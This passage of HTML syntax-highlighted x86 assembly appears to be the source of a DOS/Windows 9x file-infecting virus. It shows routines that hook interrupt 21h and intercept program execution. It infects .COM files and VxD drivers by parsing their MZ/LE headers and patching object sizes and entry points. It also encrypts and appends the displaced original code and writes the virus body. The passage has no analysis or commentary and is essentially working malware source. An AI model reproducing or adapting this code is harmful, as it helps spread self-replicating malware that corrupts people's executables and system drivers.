                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">43</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">Verify_AL</span><span class="sc0">
</span><span class="sc5">Old_i21</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">popf</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0eah</span><span class="sc0"> </span><span class="sc1">;Jmp XXXX:XXXX</span><span class="sc0">
</span><span class="sc5">Save_i21</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">Check_Exec</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4bh</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">Check_Open</span><span class="sc0">
</span><span class="sc5">Verify_AL</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">Old_i21</span><span class="sc0">
</span><span class="sc5">Infect_File</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pushad</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">Buffer</span><span class="sc4">-</span><span class="sc5">Real_Mode_Start</span><span class="sc0">
                </span><span class="sc1">;Canonicalize filename</span><span class="sc0">
</span><span class="sc5">Next_Char</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'a'</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">Skip_Char</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'z'</span><span class="sc0">
                </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">Skip_Char</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'a'</span><span class="sc4">-</span><span class="sc12">'A'</span><span class="sc0">
</span><span class="sc5">Skip_Char</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">Next_Char</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;File extension</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'MOC'</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">Infect_COM</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'DXV'</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">Pop_Exit</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Infect_Multi</span><span class="sc0">
</span><span class="sc5">Infect_COM</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">PSP</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">Return_IP</span><span class="sc4">-</span><span class="sc5">Real_Mode_Start</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">Infect_Multi</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">Start_IP</span><span class="sc4">-</span><span class="sc5">Real_Mode_Start</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4300</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Simulate_i21</span><span class="sc0"> </span><span class="sc1">;Get file attributes</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">Pop_Exit</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">24</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">Handler_i24</span><span class="sc4">-</span><span class="sc5">Real_Mode_Start</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">Save_i24</span><span class="sc4">-</span><span class="sc5">Real_Mode_Start</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Hook_Vector</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc6">not</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">mask</span><span class="sc0"> </span><span class="sc5">FA_unused</span><span class="sc4">+</span><span class="sc9">mask</span><span class="sc0"> </span><span class="sc5">FA_archive</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">Open_File</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4301</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc1">;No attributes</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Simulate_i21</span><span class="sc0"> </span><span class="sc1">;Set file attributes</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">Restore_Attrib</span><span class="sc0">
</span><span class="sc5">Open_File</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3d02h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Simulate_i21</span><span class="sc0"> </span><span class="sc1">;Open the file (read/write mode)</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">Restore_Attrib</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5700</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Simulate_i21</span><span class="sc0"> </span><span class="sc1">;Get file's date and time</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc9">mask</span><span class="sc0"> </span><span class="sc5">FT_seconds2</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc9">mask</span><span class="sc0"> </span><span class="sc5">FT_seconds2</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">Close_Restore_Attrib</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Start_IP</span><span class="sc4">-</span><span class="sc5">Real_Mode_Start</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],(</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">PSP</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">Read_Driver</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Seek_End</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">Restore_Date</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">Min_Size</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">Restore_Date</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">Max_Size</span><span class="sc0">
                </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">Restore_Date</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Seek_CX_DX</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">ENUNS_Magic</span><span class="sc4">-</span><span class="sc5">Real_Mode_Start</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Simulate_Read</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ENUNS_Magic</span><span class="sc4">-</span><span class="sc5">Real_Mode_Start</span><span class="sc4">],</span><span class="sc5">Virus_Size</span><span class="sc4">+</span><span class="sc5">ENUNS_Size</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">cwd</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Finish_Infection</span><span class="sc0">
</span><span class="sc5">Read_Driver</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">IMAGE_SIZEOF_DOS_HEADER</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Simulate_Read_CX</span><span class="sc0"> </span><span class="sc1">;Read MZ header</span><span class="sc0">
                </span><span class="sc1">;Check for a valid VxD</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc1">;DX=(Buffer-Real_Mode_Start)</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">si.MZ_magic</span><span class="sc4">],</span><span class="sc5">IMAGE_DOS_SIGNATURE</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">Restore_Date</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">si.MZ_lfarlc</span><span class="sc4">],</span><span class="sc5">IMAGE_SIZEOF_DOS_HEADER</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">Restore_Date</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">si.MZ_lfanew</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Seek_EBP</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">IMAGE_SIZEOF_VXD_HEADER</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Simulate_Read_CX</span><span class="sc0"> </span><span class="sc1">;Read LE header</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">si.LE_magic</span><span class="sc4">],(</span><span class="sc5">IMAGE_VXD_LEWO</span><span class="sc0"> </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc2">24d</span><span class="sc4">)\
</span><span class="sc0">                </span><span class="sc4">+(</span><span class="sc5">IMAGE_VXD_LEBO</span><span class="sc0"> </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc2">16d</span><span class="sc4">)+</span><span class="sc5">IMAGE_VXD_SIGNATURE</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">Restore_Date</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">si.LE_os</span><span class="sc4">],</span><span class="sc5">IMAGE_VXD_OS_DEV386</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">Restore_Date</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">si.LE_cpu</span><span class="sc4">],</span><span class="sc5">IMAGE_VXD_CPU_386</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">Restore_Date</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">si.LE_cpu</span><span class="sc4">],</span><span class="sc5">IMAGE_VXD_CPU_586</span><span class="sc0">
                </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">Restore_Date</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">si.LE_objtab</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Seek_EBP</span><span class="sc0">
                </span><span class="sc1">;Find real-mode object</span><span class="sc0">
</span><span class="sc5">Go_Next_Object</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">IMAGE_SIZEOF_OBJECT_HEADER</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">IMAGE_SIZEOF_VXD_HEADER</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Simulate_Read</span><span class="sc0"> </span><span class="sc1">;Read one object table entry</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">IMAGE_SIZEOF_VXD_HEADER\
</span><span class="sc0">                </span><span class="sc5">.OH_flags</span><span class="sc4">],</span><span class="sc5">IMAGE_OBJ_READ</span><span class="sc4">+</span><span class="sc5">IMAGE_OBJ_EXEC</span><span class="sc4">+</span><span class="sc5">IMAGE_OBJ_ALIAS16</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">Found_Real_Mode</span><span class="sc0">
                </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">si.LE_objcnt</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">Go_Next_Object</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Restore_Date</span><span class="sc0">
</span><span class="sc5">Found_Real_Mode</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">Virus_Size</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">IMAGE_SIZEOF_VXD_HEADER.OH_mapsize</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">si.LE_pagesize</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">Size_OK</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">Restore_Date</span><span class="sc0">
</span><span class="sc5">Size_OK</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">IMAGE_SIZEOF_VXD_HEADER.OH_size</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">No_Size_Patch</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">si.LE_objcnt</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">Restore_Date</span><span class="sc0"> </span><span class="sc1">;Don't patch size if last object</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">IMAGE_SIZEOF_VXD_HEADER.OH_size</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Seek_EBP</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">IMAGE_SIZEOF_VXD_HEADER.OH_size</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Simulate_Write_DX</span><span class="sc0"> </span><span class="sc1">;Patch real-mode object size</span><span class="sc0">
</span><span class="sc5">No_Size_Patch</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">si.LE_startobj</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">No_EIP_Patch</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">si.LE_eip</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jcxz</span><span class="sc0">    </span><span class="sc5">No_EIP_Patch</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,[</span><span class="sc5">edi.LE_eip</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Seek_EBP</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc5">si.LE_eip</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Simulate_Write_DX</span><span class="sc0"> </span><span class="sc1">;Patch original real-mode init proc IP</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc5">No_EIP_Patch</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Return_IP</span><span class="sc4">-</span><span class="sc5">Real_Mode_Start</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">IMAGE_SIZEOF_VXD_HEADER.OH_pagemap</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">si.LE_pagesize</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">si.LE_datapage</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">adc</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">si.LE_datapage</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">Finish_Infection</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Seek_CX_DX</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">Virus_Size</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Simulate_Read_CX</span><span class="sc0"> </span><span class="sc1">;Read original code</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Seek_End</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Crypt_Code</span><span class="sc0"> </span><span class="sc1">;Encrypt original code</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Simulate_Write</span><span class="sc0"> </span><span class="sc1">;Write original code</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">ENUNS_Size</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">ENUNS_Mark</span><span class="sc4">-</span><span class="sc5">Real_Mode_Start</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Simulate_Write</span><span class="sc0"> </span><span class="sc1">;Write ENUNS data</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Seek_CX_DX</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">Virus_Size</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
